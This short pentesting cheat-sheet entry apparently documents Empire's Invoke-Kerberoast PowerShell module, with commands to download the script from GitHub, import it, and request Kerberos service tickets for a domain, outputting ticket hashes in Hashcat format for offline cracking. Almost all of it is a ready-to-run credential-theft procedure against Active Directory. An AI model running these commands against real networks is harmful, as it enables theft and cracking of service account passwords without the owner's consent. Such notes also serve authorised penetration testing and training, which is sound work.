> Empire is a post-exploitation framework that includes a pure-PowerShell2.0 Windows agent, and a pure Python 2.6/2.7 Linux/OS X agent.
> 
> Requests service tickets for kerberoast-able accounts and returns extracted ticket hashes.

#Active_Directory_Authentication #NTLM_Hash #Active_Directory_Enumeration 

Download
```
wget https://raw.githubusercontent.com/EmpireProject/Empire/master/data/module_source/credentials/Invoke-Kerberoast.ps1
```

Import module
```
. .\Invoke-Kerberoast.ps1
```

Usage
```
Invoke-Kerberoast -Domain hentai.com -OutputFormat Hashcat | fl
```